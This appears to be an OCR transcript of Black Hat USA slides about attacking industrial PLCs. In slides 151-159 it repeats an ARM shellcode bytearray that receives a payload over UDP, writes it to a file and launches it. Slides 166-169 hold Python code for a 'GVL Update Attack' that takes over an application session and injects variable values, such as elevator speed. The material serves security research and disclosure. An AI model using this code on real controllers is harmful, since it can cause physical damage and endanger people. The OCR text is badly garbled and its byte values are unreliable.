Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 151

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 152

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 153

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 154

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 155

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 156

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 157

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 158

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 159

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 160

GVL And Other Vegies

Can we get the same effect with a simpler approach ?

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
GVL And Other Vegies
Can we get the same effect with a simpler approach ?
```

## Slide 161

### GVL And Other Vegies

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 2B: GVL And Other Vegies iil
Object ‘GVL’ - Global Variable List§]
A global variable list is used for the declaration, editing and display of global variables.
A GVL is added to the application or the project with the command Project » Add object » Global Variable List .
If you insert a GVL under an application in the Device tree, the variables are valid within this application. If you add a GVL in the Pous view, the variables are valid for the entire project.
```

## Slide 162

GVL And Other Vegies

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
GVL And Other Vegies
```

## Slide 163

GVL And Other Vegies

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
GVL And Other Vegies
```

## Slide 164

GVL And Other Vegies

#BHUSA  @BlackHatEvents

## Slide 165

### GVL And Other Veggies

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LIISA &Ori GVL And Other Veggies
= GVis xpress lype Value Prepared value Address Comment
T GVL_Persistent
```

## Slide 166

### GVL Update Attack

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
gl, 11, al = dev.dev_channel.create_packet(DATA_SEND_REQUEST,
8x62, # CmpApp
GVL Update Attack
8x61, # Create Applicaiton Session
t =DEFAULT_NETMASK)
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
print(
if resp is None:
print('[>] G1ND1L4: cant proceed to GVL values writing no Application session id received.')
tags = SNPv4Tags(resp.get_app_layer()[20:], ‘app')
application_session_id = tags.application_identification_data[2: 6]
application_identification_data = tags.application_identification_datal22: 26]
print('[>] G1ND1L4: Received Application Management Session ID: {idd}' .format(
idd=[hex(i) for i in application_session_id]))
print('[>] G1ND1L4: Received Application identification DATA : {idd}'.format(
idd=[hex(i) for i in application_identification_data]))
print¢
STAGE 2: inject GVL values_
tags = SNPv4Tags(resp.get_app_layer()(20:], ‘app')
application_session_id = tags.application_identification_data[2: 6]
application_identification_data = tags.application_identification_data[22: 26]
```

## Slide 167

### GVL Update Attack

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GVL Update Attack
gl, 11, al = dev.dev_channel.create_packet(DATA_SEND_REQUEST,
0x02, # CmpApp
8x61, # Create Applicaiton Session
t =DEFAULT_NETMASK)
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
print(
"[>] GIND1L4: _o0 STAGE 1: Get Application session id___________-_- ")
if resp is None:
print('[>] G1ND1L4: cant proceed to GVL values writing no Application session id received.')
tags = SNPv4Tags(resp.get_app_layer()[20:], ‘app')
application_session_id = tags.application_identification_data[2: 6]
application_identification_data = tags.application_identification_datal22: 26]
print('[>] G1ND1L4: Received Application Management Session ID: {idd}' .format(
idd=[hex(i) for i in application_session_id]))
print('[>] G1ND1L4: Received Application identification DATA : {idd}'.format(
idd=[hex(i) for i in application_identification_data]))
print¢
STAGE 2: inject GVL values_
tags = SNPv4Tags(resp.get_app_layer()(20:], ‘app')
application_session_id = tags.application_identification_data[2: 6]
application_identification_data = tags.application_identification_data[22: 26]
```

## Slide 168

### GVL Update Attack

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GVL Update Attack
gl, 11, al = dev.dev_channel.create_packet(DATA_SEND_REQUEST,
0x02, # CmpApp
8x61, # Create Applicaiton Session
t =DEFAULT_NETMASK)
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
print(
"[>] GIND1L4: _o0 STAGE 1: Get Application session id___________-_- ")
if resp is None:
print('[>] G1ND1L4: cant proceed to GVL values writing no Application session id received.')
tags = SNPv4Tags(resp.get_app_layer()[20:], ‘app')
application_session_id = tags.application_identification_data[2: 6]
application_identification_data = tags.application_identification_datal22: 26]
print('[>] G1ND1L4: Received Application Management Session ID: {idd}' .format(
idd=[hex(i) for i in application_session_id]))
print('[>] G1ND1L4: Received Application identification DATA : {idd}'.format(
idd=[hex(i) for i in application_identification_data]))
"[>] GIND1L4: _ _STAGE 2: inject GVL values_
tags = SNPv4Tags(resp.get_app_layer()(20:], ‘app') Seay
application_session_id = tags.application_identification_data[2: 6]
application_identification_data = tags.application_identification_data[22: 26]
```

## Slide 169

### GVL Update Attack

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA @Oe&s5 GVL Update Attack
gl, Ll, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST, ©
@x1B, # CmpMonito
0x62, # Update GVLs
=DEFAULT_NETMASK)
first_part = bytearray([0x01, 0x94, 0x80, 9x00, })
second_part = bytear
8x68, 6x08, 6x17,
8x04,
8x66, 0x88, 6x17,
8x84,
al += first_part + application_session_id + application_identification_data + second_part
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
resp is None:
print('[>] G1ND1L4: failed received answer for GVL injection’)
else:
print(
*[>] G1ND1L4: Successfully injected GVL varaibles (Elevator Speed=10000, Acceleration=20000, Declaration=20000)!!!!!!')
```

## Slide 170

### GVL Update Attack

